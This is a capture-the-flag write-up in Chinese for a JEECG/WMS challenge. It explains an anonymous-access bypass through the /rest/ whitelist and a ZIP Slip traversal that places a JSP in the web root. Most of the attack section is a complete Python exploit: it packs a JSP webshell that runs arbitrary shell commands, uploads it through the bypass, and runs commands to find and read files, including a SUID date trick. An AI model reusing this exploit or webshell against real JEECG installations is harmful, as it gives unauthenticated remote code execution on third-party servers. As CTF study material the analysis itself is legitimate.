# SU_wms

## 题目简述
题目是 JEECG/WMS 系统漏洞链。附件的 Dockerfile 和 compose 确认 Tomcat/MySQL 环境、WAR 内 DB 配置补丁和随机 flag 路径；SQL 和 WAR 内容很大，不适合全文写入。核心漏洞是 `/rest/*` 路径在拦截器中被直接放行，且 Spring `params={...}` 可由 POST body 参数命中后台方法；随后 `CgformTemplateController` 的模板 ZIP 解压存在目录穿越，可写 JSP 到 Web 根目录。

## 解题过程
主要流程如下

1. /rest/* 存在鉴权绕过。

2. CgformTemplateController 存在模板 ZIP 解压目录穿越，能够把任意 JSP 写到 Web 根目
录。

3. 提权

鉴权绕过

AuthInterceptor.preHandle 的关键代码如下：文
件：/tmp/jadx_authint/AuthInterceptor.java

```text
public boolean preHandle(HttpServletRequest request, HttpServletResponse
response, Object object) throws Exception {
String realRequestPath;
String requestPath = ResourceUtil.getRequestPath(request);
if (requestPath.matches("^rest/[a-zA-Z0-9_/]+$") ||
this.excludeUrls.contains(requestPath) || moHuContain(this.excludeContainUrls,
requestPath)) {
return true;
}
...
}
```

可以看到，只要 requestPath 满足：^rest/[a-zA-Z0-9_/]+$ 就会直接放行，不走后续权
限校验。

requestPath 还需要我们进一步构造：

```
在/tmp/jadx_resutil/ResourceUtil.java:

public static String getRequestPath(HttpServletRequest request) {
String queryString = request.getQueryString();
String requestPath = request.getRequestURI();
if (StringUtils.isNotEmpty(queryString)) {
requestPath = requestPath + "?" + queryString;
}
if (requestPath.indexOf("&") > -1) {
requestPath = requestPath.substring(0, requestPath.indexOf("&"));
}
return requestPath.substring(request.getContextPath().length() + 1);

}
```

这里有个关键点：

- 只有存在 query string 时，?xxx 才会拼接到路径后面

- 如果 URL 本身没有 query string，那么 requestPath 就是纯路径

例如：

/jeewms/rest/cgformTemplateController 得到的 requestPath 正是：
rest/cgformTemplateController 它完全匹配正则，因此会被匿名放行。

那么，为什么后台接口可以被前台调用呢？

JEECG 这里很多 controller 方法不是靠不同 URL 区分，而是靠：

```
@RequestMapping(params = {"uploadZip"})
@RequestMapping(params = {"doAdd"})
```

来做方法分发。

Spring MVC 在匹配 params={...} 时，使用的是“请求参数”概念，而不只是 URL 查询参数，
POST 表单 body 中的参数同样会参与匹配。

所以我们可以：

保持为 /jeewms/rest/cgformTemplateController • URL

- 不带 query string，绕过鉴权

- 把 uploadZip= 或 doAdd= 放进 POST body

这样就能匿名命中原本后台使用的方法。

ZIP 解压目录穿越

```
@RequestMapping(params = {"doAdd"})
@ResponseBody
public AjaxJson doAdd(CgformTemplateEntity cgformTemplate, HttpServletRequest
request) {
AjaxJson j = new AjaxJson();
try {
this.cgformTemplateService.save(cgformTemplate);
String basePath = getUploadBasePath(request);
File templeDir = new File(basePath + File.separator +
cgformTemplate.getTemplateCode());

if (!templeDir.exists()) {
templeDir.mkdirs();
}
removeZipFile(basePath + File.separator + "temp" + File.separator +
cgformTemplate.getTemplateZipName(), templeDir.getAbsolutePath());
removeIndexFile(basePath + File.separator + "temp" + File.separator +
cgformTemplate.getTemplatePic(), templeDir.getAbsolutePath());
...
} catch (Exception e) {
...
}
}
```

问题在这里：

$$
File templeDir = new File(basePath + File.separator +
$$
cgformTemplate.getTemplateCode());

templateCode 完全由用户控制，没有做规范化或路径校验，可以直接传入 ../../../../ 。
ZIP 会被解压到这个目录.同文件中的 removeZipFile ：

```
private void removeZipFile(String zipFilePath, String templateDir) throws
IOException {
File zipFile = new File(zipFilePath);
if (zipFile.exists()) {
try {
if (!zipFile.isDirectory()) {
try {
unZipFiles(zipFile, templateDir);
org.jeecgframework.core.util.FileUtils.delete(zipFilePath);
} catch (IOException e) {
...
}
}
} catch (Throwable th) {
...
}
}
}
```

也就是说，上传的 ZIP 会被解压到 templateDir ，而 templateDir 由 templateCode 拼出
来。

同文件中的 uploadZip ：

```
@RequestMapping(params = {"uploadZip"})
@ResponseBody
public AjaxJson uploadZip(HttpServletRequest request, HttpServletResponse
response) {
AjaxJson j = new AjaxJson();
MultipartHttpServletRequest multipartRequest =
(MultipartHttpServletRequest) request;
Map<String, MultipartFile> fileMap = multipartRequest.getFileMap();
File tempDir = new File(getUploadBasePath(request), "temp");
if (!tempDir.exists()) {
tempDir.mkdirs();
}
for (Map.Entry<String, MultipartFile> entity : fileMap.entrySet()) {
MultipartFile file = entity.getValue();
File picTempFile = new File(tempDir.getAbsolutePath(), "/zip_" +
request.getSession().getId() + "." +
org.jeecgframework.core.util.FileUtils.getExtend(file.getOriginalFilename()));
try {
if (picTempFile.exists()) {
FileUtils.forceDelete(picTempFile);
}
FileCopyUtils.copy(file.getBytes(), picTempFile);
} catch (Exception e) {
...
}
j.setObj(picTempFile.getName());
}
...
return j;
}
```

这意味着：

1. 先调用匿名 uploadZip

2. 让服务端把恶意 ZIP 存到模板临时目录

3. 再调用匿名 doAdd

4. 用穿越后的 templateCode 指定最终解压目录

getUploadBasePath 这里再做一个目录穿越

```
private String getUploadBasePath(HttpServletRequest request) {
ClassLoader classLoader = getClass().getClassLoader();

URL resource = classLoader.getResource("sysConfig.properties");
String path = resource.getPath();
return (path.substring(0, path.indexOf("sysConfig.properties")) +
"online/template").replaceAll("%20", " ");
}
```

很明显在当前题目环境中，实际落点是：

$$
/usr/local/tomcat/webapps/jeewms/WEB-INF/classes/online/template
$$

因此：

$$
/usr/local/tomcat/webapps/jeewms/WEB-
$$

$$
INF/classes/online/template/../../../../
$$

规整后正好是：

$$
/usr/local/tomcat/webapps/jeewms
$$

也就是 Web 根目录。然后在zip打个马就行了

这里我就直接放exp了，最后还有一步suid date提权就不紧到说了

```python
import argparse
import io
import json
import re
import sys
import urllib.parse
import urllib.request
import uuid
import zipfile

DEFAULT_FIND_FLAG_CMD = "find / -maxdepth 2 -name 'flag_*' 2>/dev/null | head -
n1"
DATE_FALLBACK_CMD = '/usr/bin/date -f "{path}" 2>&1'
FLAG_RE = re.compile(r"suctf\{[^}\r\n]*\}")

def build_shell_zip(jsp_name: str) -> bytes:
jsp = """<%@ page import="java.io.*" %><%
String cmd=request.getParameter("cmd");
if(cmd!=null){
Process p=new ProcessBuilder("/bin/sh","-
c",cmd).redirectErrorStream(true).start();
InputStream is=p.getInputStream();

int ch;
while((ch=is.read())!=-1){ out.print((char)ch); }
}
%>
"""
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
zf.writestr(jsp_name, jsp)
return buf.getvalue()

def multipart_form(fields, files):
boundary = "----codex-" + uuid.uuid4().hex
body = io.BytesIO()
for name, value in fields.items():
body.write(f"--{boundary}\r\n".encode())
body.write(
f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode()
)
body.write(value.encode())
body.write(b"\r\n")
for name, (filename, content, content_type) in files.items():
body.write(f"--{boundary}\r\n".encode())
body.write(
(
f'Content-Disposition: form-data; name="{name}"; '
f'filename="{filename}"\r\n'
).encode()
)
body.write(f"Content-Type: {content_type}\r\n\r\n".encode())
body.write(content)
body.write(b"\r\n")
body.write(f"--{boundary}--\r\n".encode())
return boundary, body.getvalue()

def http_request(url: str, data=None, headers=None) -> str:
req = urllib.request.Request(url, data=data, headers=headers or {})
with urllib.request.urlopen(req, timeout=15) as resp:
return resp.read().decode("utf-8", errors="replace")

def normalize_base(base: str) -> str:
if "://" not in base:
base = "http://" + base
base = base.rstrip("/")
if not base.endswith("/jeewms"):

base += "/jeewms"
return base

def deploy_shell(base: str) -> str:
controller = base + "/rest/cgformTemplateController"
jsp_name = f"ws_{uuid.uuid4().hex[:8]}.jsp"
template_name = f"tpl_{uuid.uuid4().hex[:8]}"
shell_zip = build_shell_zip(jsp_name)

boundary, mp_body = multipart_form(
{"uploadZip": ""},
{"f": ("payload.zip", shell_zip, "application/zip")},
)
upload_resp = http_request(
controller,
data=mp_body,
headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
)
upload_json = json.loads(upload_resp)
temp_zip_name = upload_json["obj"]
if not temp_zip_name:
raise RuntimeError(f"uploadZip failed: {upload_resp}")

form = urllib.parse.urlencode(
{
"doAdd": "",
"templateName": template_name,
"templateCode": "../../../../",
"templateZipName": temp_zip_name,
"templateType": "default",
"templateShare": "Y",
}
).encode()
add_resp = http_request(
controller,
data=form,
headers={"Content-Type": "application/x-www-form-urlencoded"},
)
add_json = json.loads(add_resp)
if not add_json.get("success"):
raise RuntimeError(f"doAdd failed: {add_resp}")

return f"{base}/{jsp_name}"

def run_shell(shell_url: str, cmd: str) -> str:

cmd_url = shell_url + "?cmd=" + urllib.parse.quote(cmd, safe="")
return http_request(cmd_url)

def find_flag_path(shell_url: str) -> str:
path = run_shell(shell_url, DEFAULT_FIND_FLAG_CMD).strip().splitlines()
if not path:
raise RuntimeError("flag file not found")
return path[0].strip()

def read_flag(shell_url: str) -> str:
flag_path = find_flag_path(shell_url)
for cmd in (f'cat "{flag_path}" 2>&1',
DATE_FALLBACK_CMD.format(path=flag_path)):
output = run_shell(shell_url, cmd)
match = FLAG_RE.search(output)
if match:
return match.group(0)
raise RuntimeError(f"unable to extract flag from {flag_path}")

def main():
parser = argparse.ArgumentParser(
description="Exploit JEECG cgformTemplateController traversal to JSP
```

RCE"

```
)
parser.add_argument(
"base",
nargs="?",
default="http://<target>:10018/jeewms",
help="Base URL, e.g. http://127.0.0.1:8081/jeewms or
<target>:10018",
)
parser.add_argument(
"--cmd",
help="Command to execute through the dropped JSP",
)
args = parser.parse_args()

base = normalize_base(args.base)
shell_url = deploy_shell(base)

print(f"[+] shell_url: {shell_url}")
if args.cmd:
result = run_shell(shell_url, args.cmd)
print(f"[+] cmd: {args.cmd}")

print(result)
else:
print(read_flag(shell_url))

if __name__ == "__main__":
try:
main()
except Exception as exc:
print(f"[!] {exc}", file=sys.stderr)
sys.exit(1)
```

## 方法总结
- 核心技巧：鉴权绕过 + ZIP Slip 写 JSP
- 识别信号：`/rest/...` 被白名单放行，后台方法靠 request params 分发，存在 ZIP 解压路径穿越。
- 复用要点：保持 URL 满足白名单，把后台方法参数放在 POST body；上传恶意 ZIP 写入 JSP 后再读取随机路径 flag。
